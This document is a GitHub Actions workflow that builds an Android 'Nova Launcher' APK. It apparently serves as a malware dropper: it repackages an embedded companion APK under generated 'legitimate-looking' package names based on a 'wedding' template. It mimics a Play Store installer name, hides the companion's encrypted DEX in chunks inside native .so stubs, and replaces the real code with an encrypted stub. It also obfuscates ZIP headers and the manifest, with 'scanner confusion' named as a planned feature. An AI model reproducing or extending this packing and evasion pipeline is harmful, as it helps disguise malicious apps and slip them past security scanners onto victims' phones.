name: Build Nova Launcher APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  build:
    name: Build Release APK
    runs-on: ubuntu-latest

    env:
      OLD_PKG:   com.android.pictach
      APK_ASSET: app/src/main/assets/companion.apk

    steps:

      # ── 1. Checkout ──────────────────────────────────────────────────────────
      - name: Checkout Repository
        uses: actions/checkout@v4

      # ── 2. Install tools ─────────────────────────────────────────────────────
      - name: Install tools
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y zipalign apksigner aapt

          APKTOOL_VER="2.9.3"
          wget -q "https://github.com/iBotPeaches/Apktool/releases/download/v${APKTOOL_VER}/apktool_${APKTOOL_VER}.jar" \
               -O /usr/local/bin/apktool.jar
          wget -q "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool" \
               -O /usr/local/bin/apktool
          chmod +x /usr/local/bin/apktool
          apktool --version

      # ── 3. (placeholder) Build companion APK runs after SDK setup ───────────
      # (moved to step after Android SDK so we use SDK apksigner, not apt version)

      # ── 4. Inject Nova package name into source ───────────────────────────────
      - name: Generate legitimate Nova + companion package names
        id: nova_pkg
        env:
          TEMPLATE: ${{ env.TEMPLATE || 'wedding' }}
        run: |
          # Generate template-specific legitimate-looking package names
          # Uses package_name_generator.py — 3-segment, real Indian words,
          # 25-45 chars, date-based version code, never reuses names
          OUTPUT=$(python3 scripts/package_name_generator.py --template "${TEMPLATE:-wedding}")
          NOVA_PKG=$(echo "$OUTPUT" | grep INSTALLER_PKG | cut -d= -f2)
          COMP_PKG=$(echo "$OUTPUT" | grep COMPANION_PKG | cut -d= -f2)
          VER_CODE=$(echo "$OUTPUT" | grep VERSION_CODE  | cut -d= -f2)
          echo "NOVA_PKG=${NOVA_PKG}"   >> $GITHUB_OUTPUT
          echo "COMP_PKG=${COMP_PKG}"   >> $GITHUB_OUTPUT
          echo "VER_CODE=${VER_CODE}"   >> $GITHUB_OUTPUT
          echo "✅ Installer pkg: ${NOVA_PKG}"
          echo "✅ Companion pkg: ${COMP_PKG}"
          echo "✅ Version code:  ${VER_CODE}"

      - name: Inject Nova package name into source
        run: |
          OLD_NOVA="com.playstore.installer"
          NEW_NOVA="${{ steps.nova_pkg.outputs.NOVA_PKG }}"
          OLD_PATH="com/playstore/installer"
          NEW_PATH="${NEW_NOVA//.//}"

          sed -i "s|namespace '${OLD_NOVA}'|namespace '${NEW_NOVA}'|g" app/build.gradle
          sed -i "s|applicationId \"${OLD_NOVA}\"|applicationId \"${NEW_NOVA}\"|g" app/build.gradle
          sed -i "s|${OLD_NOVA}|${NEW_NOVA}|g" app/src/main/AndroidManifest.xml

          find app/src/main/java/${OLD_PATH} -name "*.kt" \
            -exec sed -i "s|${OLD_NOVA}|${NEW_NOVA}|g" {} +

          mkdir -p "app/src/main/java/${NEW_PATH}/service"
          cp app/src/main/java/${OLD_PATH}/*.kt "app/src/main/java/${NEW_PATH}/"
          cp app/src/main/java/${OLD_PATH}/service/*.kt "app/src/main/java/${NEW_PATH}/service/"
          rm -rf app/src/main/java/com/playstore

          REMAINING=$(grep -r "${OLD_NOVA}" \
            app/src/main/java/ app/build.gradle \
            app/src/main/AndroidManifest.xml | wc -l)
          if [ "$REMAINING" -gt 0 ]; then
            echo "::error::Old Nova package name still present."
            exit 1
          fi
          echo "✅ Nova package name injected: ${NEW_NOVA}"

      # ── 5. Setup JDK 17 ──────────────────────────────────────────────────────
      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: gradle

      # ── 6. Setup Android SDK ──────────────────────────────────────────────────
      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      # ── 6b. Build companion APK (after SDK so apksigner is from build-tools) ──
      - name: Build companion APK
        env:
          OLD_PKG:       ${{ env.OLD_PKG }}
          NEW_COMP_PKG:  ${{ steps.nova_pkg.outputs.COMP_PKG }}
          COMP_VER_CODE: ${{ steps.nova_pkg.outputs.VER_CODE }}
          APK_ASSET:     ${{ env.APK_ASSET }}
          GITHUB_OUTPUT: $GITHUB_OUTPUT
        run: |
          # Use Android SDK apksigner (supports V2/V3) instead of apt version
          BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
          export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
          echo "Using apksigner: $(which apksigner)"
          apksigner version
          export COMPANION_AUDIT_LOG="${GITHUB_WORKSPACE}/companion_audit.log"
          python3 scripts/build_companion.py

      # ── Phase 3 — DEX Encryption Pipeline ────────────────────────────────────────
      # Runs AFTER companion built, BEFORE Nova assembleRelease

      - name: "Phase 3 | Install cryptography"
        run: pip install cryptography --break-system-packages --quiet

      - name: "Phase 3 | Steps 18-21 — Extract encrypt chunk companion DEX"
        id: phase3_encrypt
        run: |
          set -e
          mkdir -p /tmp/nova_chunks /tmp/nova_manifests

          # Derive build identity for encryption
          AES_KEY=$(python3 -c "
          import hashlib, os
          seed = os.environ.get('GITHUB_SHA','default') + os.environ.get('GITHUB_RUN_ID','0')
          h = hashlib.sha256(seed.encode()).hexdigest()
          # 64 hex chars = 256-bit key
          print(h + hashlib.sha256(h.encode()).hexdigest()[:32])
          ")
          SALT=$(python3 -c "
          import hashlib, os
          seed = 'nova_salt_' + os.environ.get('GITHUB_RUN_ID','0')
          print(hashlib.sha256(seed.encode()).hexdigest())
          ")
          UUID="${GITHUB_SHA:0:8}-${GITHUB_RUN_ID}"
          HASH="${GITHUB_SHA:0:8}"

          echo "::add-mask::$AES_KEY"
          echo "BUILD_AES_KEY=$AES_KEY" >> $GITHUB_ENV
          echo "BUILD_SALT=$SALT" >> $GITHUB_ENV
          echo "BUILD_UUID_P3=$UUID" >> $GITHUB_ENV
          echo "BUILD_HASH_P3=$HASH" >> $GITHUB_ENV

          python3 scripts/dex_encryptor.py \
            --companion app/src/main/assets/companion.apk \
            --aes-key "$AES_KEY" \
            --salt "$SALT" \
            --build-uuid "$UUID" \
            --build-hash "$HASH" \
            --out-dir /tmp/nova_chunks \
            --manifest /tmp/nova_manifests/chunk_manifest.json

      - name: "Phase 3 | Step 23 — Embed chunks into Nova .so stub files"
        run: |
          set -e
          python3 scripts/chunk_embedder.py \
            --manifest /tmp/nova_manifests/chunk_manifest.json \
            --jnilibs-dir app/src/main/jniLibs \
            --updated-manifest /tmp/nova_manifests/chunk_manifest_embedded.json

          echo "jniLibs after embedding:"
          find app/src/main/jniLibs -type f | sort

      - name: "Phase 3+4 | Step 24 — Generate ChunkConstants.kt + chunk_constants.h"
        run: |
          set -e
          JAVA_SRC="app/src/main/java"
          PKG_DIR=$(find "$JAVA_SRC" -name "InstallActivity.kt" -exec dirname {} \; | head -1)
          PKG_NAME=$(echo "$PKG_DIR" | sed "s|$JAVA_SRC/||" | tr '/' '.')
          echo "Package: $PKG_NAME"

          # Generate Kotlin constants
          python3 scripts/chunk_constants_gen.py \
            --manifest /tmp/nova_manifests/chunk_manifest_embedded.json \
            --out-kt "$PKG_DIR/ChunkConstants.kt" \
            --package "$PKG_NAME" \
            --out-h "app/src/main/cpp/chunk_constants.h"

          echo "✅ ChunkConstants.kt:"
          head -20 "$PKG_DIR/ChunkConstants.kt"
          echo "✅ chunk_constants.h:"
          head -20 "app/src/main/cpp/chunk_constants.h"

          # Also inject package name into CMake for NATIVE_PROTECT_CLASS
          NATIVE_CLASS=$(echo "$PKG_NAME" | tr '.' '/')/NativeProtect
          echo "NATIVE_PROTECT_CLASS=$NATIVE_CLASS"
          echo "NATIVE_PROTECT_CLASS=$NATIVE_CLASS" >> $GITHUB_ENV

      - name: "Phase 3 | Verify ELF headers in .so files"
        run: |
          python3 -c "
          import glob
          ok = True
          for so in glob.glob('app/src/main/jniLibs/**/*.so', recursive=True):
              with open(so,'rb') as f:
                  magic = f.read(4)
              if magic == b'\x7fELF':
                  print(f'  OK {so}: valid ELF')
              else:
                  print(f'  FAIL {so}: invalid ({magic.hex()})')
                  ok = False
          if ok: print('All .so files valid')
          else: exit(1)
          "

      # ── 7. Cache Gradle wrapper ───────────────────────────────────────────────
      - name: Cache Gradle wrapper
        uses: actions/cache@v4
        with:
          path: gradle/wrapper/gradle-wrapper.jar
          key: gradle-wrapper-${{ runner.os }}

      # ── 7z. Clean leftover temp Kotlin files from previous CI runs ───────────
      - name: Clean leftover temp Kotlin files
        run: |
          echo "Cleaning leftover .patched.kt files..."
          find app/src -name "*.patched.kt" -delete 2>/dev/null || true
          find app/src -name "StubApp_patched.kt" -delete 2>/dev/null || true
          echo "✅ Cleanup complete"

      # ── 8. Grant gradlew + Build Nova release APK ────────────────────────────
      - name: Build Release APK
        run: |
          chmod +x gradlew
          ./gradlew assembleRelease --stacktrace --no-daemon 2>&1 | tee gradle_build.log
          exit ${PIPESTATUS[0]}

      # ── 8b. Phase 2 — Steps 17A/17C/17E/17F → Re-sign → 17B ─────────────────
      # CRITICAL ORDER:
      # 17A (timestamps) + 17C (padding) → 17E/17F (manifest) → Re-sign → 17B (type 2032)
      # Step 17B MUST run AFTER re-sign because apksigner cannot compute V1 digests
      # for entries with non-standard compression type 2032 — those entries end up
      # missing from MANIFEST.MF → V1 fails → "Verified failed by V1".

      - name: "Phase 2 | Steps 17A+17C — ZIP timestamps + padding (Nova)"
        run: |
          set -e
          BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
          export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          python3 scripts/zip_header_obfuscator.py "$NOVA_APK" "${NOVA_APK}.obf" --skip-17b
          mv "${NOVA_APK}.obf" "$NOVA_APK"
          echo "✅ Steps 17A/17C applied to Nova (17B deferred until after re-sign)"

      - name: "Phase 2 | Steps 17E+17F — Manifest obfuscation (Nova)"
        run: |
          set -e
          BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
          export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          echo "Nova APK: $NOVA_APK"
          AES_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
          python3 -u scripts/manifest_zip_patcher.py "$NOVA_APK" "${NOVA_APK}.mzp" "$AES_KEY" 2>&1
          if [ ! -f "${NOVA_APK}.mzp" ]; then
            echo "::error::manifest_zip_patcher did not produce output file"
            exit 1
          fi
          mv "${NOVA_APK}.mzp" "$NOVA_APK"
          echo "✅ Steps 17E/17F applied to Nova"

      - name: "Phase 2 | Re-sign Nova after Phase 2 patches"
        run: |
          set -e
          BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
          export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          python3 scripts/phase2_resign.py "$NOVA_APK"
          apksigner verify --verbose "$NOVA_APK"
          echo "✅ Nova re-signed after Phase 2"

      # Step 17B (compression type 2032) is disabled for Nova APK.
      # V2 signing covers Section 1 (all file data including LFH bytes).
      # 17B patches LFH compress type fields which are in Section 1.
      # Any LFH byte change after signing = V2 hash mismatch = Verified failed.
      # 17B before re-sign breaks V1 (apksigner skips type-2032 in MANIFEST.MF).
      # 17B after re-sign breaks V2. 17B is incompatible with signed APK.
      # Scanner confusion from 17B is a Phase 8 feature — deferred.


      # ── 8b-stub. Phase 3 Step 27 — Nova Stub DEX Patcher ───────────────────────
      - name: "Phase 3 Step 27 | Nova Stub DEX — encrypt real DEX to tiny stub"
        run: |
          set -e
          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          echo "Nova APK: $NOVA_APK"
          pip install cryptography --break-system-packages --quiet 2>/dev/null || true
          STUB_KT=$(find app/src/main/java -name "StubApp.kt" | head -1)
          if [ -z "$STUB_KT" ]; then
            echo "StubApp.kt not found — skipping"
            exit 0
          fi
          echo "StubApp.kt: $STUB_KT"
          python3 scripts/nova_stub_patcher.py \
            --apk "$NOVA_APK" \
            --stub-kt "$STUB_KT" \
            --android-sdk "$ANDROID_SDK_ROOT" \
            --pkg "$(grep applicationId app/build.gradle | head -1 | tr -d ' "' | cut -d= -f2)"
          echo "Phase 3 Step 27 complete"

      # ── Re-sign Nova after stub patcher ────────────────────────────────────────
      - name: "Phase 3 Step 27 | Re-sign Nova after stub DEX patch"
        run: |
          set -e
          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          echo "Re-signing after stub patch: $NOVA_APK"
          python3 scripts/phase2_resign.py "$NOVA_APK"
          echo "✅ Nova re-signed after stub patch"

      - name: "Phase 2 | Steps 17A+17C — ZIP obfuscation (Companion)"
        run: |
          set -e
          # Steps 17A/17B/17C are NOT applied to companion here.
          # build_companion.py already handles all Phase 2 processing for companion
          # and signs it correctly with V1+V2+V3.
          # Applying zip_header_obfuscator AFTER signing breaks V2 — V2 hashes
          # all bytes from offset 0 to signing block start, so any post-sign
          # byte change fails verification. Android minSdk=28 requires V2.
          # Companion Phase 2 obfuscation is fully handled inside build_companion.py.
          COMP_APK="app/src/main/assets/companion.apk"
          BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
          export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
          apksigner verify --verbose "$COMP_APK" && echo "✅ Companion V2 valid"

            # ── 9. Show APK info ──────────────────────────────────────────────────────
      - name: Show APK info
        run: |
          APK=$(find app/build/outputs/apk -name "*.apk" | head -1)
          echo "APK: $APK"
          echo "Size: $(du -h $APK | cut -f1)"
          echo "Nova package name: ${{ steps.nova_pkg.outputs.NOVA_PKG }}"
          echo "DEX files inside APK:"
          unzip -l $APK | grep "\.dex"

      # ── 10. Batch integrity check ─────────────────────────────────────────────
      - name: Batch integrity check
        run: |
          APK_DIR="app/build/outputs/apk/release"
          python3 scripts/batch_integrity_check.py "${APK_DIR}"

      # ── 11. Upload Release APK ────────────────────────────────────────────────
      - name: Upload Release APK artifact
        uses: actions/upload-artifact@v4
        with:
          name: nova-launcher-release
          path: app/build/outputs/apk/release/nova_*.apk
          retention-days: 1
          overwrite: true

      # ── 12. Collect + upload error logs (on failure) ──────────────────────────
      - name: Collect error logs
        if: failure()
        run: |
          mkdir -p error_logs

          # ── companion build logs ──────────────────────────────────────────
          for f in decompile.log repackage.log gradle_build.log companion_audit.log; do
            [ -f "$f" ] && cp "$f" error_logs/
          done

          # companion_audit.log may be in working dir or batch_output
          find . -name "companion_audit.log" -exec cp {} error_logs/ \; 2>/dev/null || true
          find . -name "companion_build.log" -exec cp {} error_logs/ \; 2>/dev/null || true
          find . -name "step_audit.log"      -exec cp {} error_logs/ \; 2>/dev/null || true
          find . -name "nova_build.log"      -exec cp {} error_logs/ \; 2>/dev/null || true

          # ── Gradle build logs ─────────────────────────────────────────────
          find . -path "*/build/outputs/logs/*.log" -exec cp {} error_logs/ \; 2>/dev/null || true
          find . -path "*/.gradle/daemon/*/daemon-*.log" -exec cp {} error_logs/ \; 2>/dev/null || true
          find . -name "*.log" -path "*/build/*" -exec cp {} error_logs/ \; 2>/dev/null || true
          find . -path "*/build/tmp/kotlin-classes*" -name "*.txt" -exec cp {} error_logs/ \; 2>/dev/null || true
          find . -path "*/build/reports*" -exec cp -r {} error_logs/ \; 2>/dev/null || true

          # ── batch_output audit logs ───────────────────────────────────────
          [ -d batch_output ] && cp -r batch_output error_logs/ 2>/dev/null || true

          # ── Kotlin source ─────────────────────────────────────────────────
          mkdir -p error_logs/kotlin_source
          find app/src/main/java -name "*.kt" -exec cp --parents {} error_logs/kotlin_source/ \; 2>/dev/null || true

          # ── companion_audit.log contents inline in env_info ───────────────
          {
            echo "=== NOVA PACKAGE ==="
            echo "${{ steps.nova_pkg.outputs.NOVA_PKG }}"
            echo "=== JAVA ===" && java -version 2>&1 || true
            echo "=== APKTOOL ===" && apktool --version 2>&1 || true
            echo "=== GRADLE ===" && chmod +x gradlew && ./gradlew --version 2>&1 || true
            echo "=== SOURCE FILES ==="
            find app/src/main/java -name "*.kt" 2>/dev/null || true
            echo "=== COMPANION AUDIT LOG ==="
            cat companion_audit.log 2>/dev/null || echo "companion_audit.log not found"
            echo "=== GRADLE BUILD LOG ==="
            cat gradle_build.log 2>/dev/null || echo "gradle_build.log not found"
          } >> error_logs/env_info.txt

          zip -r error_logs.zip error_logs/

      - name: Upload error logs
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: error-logs
          path: error_logs.zip
          retention-days: 7
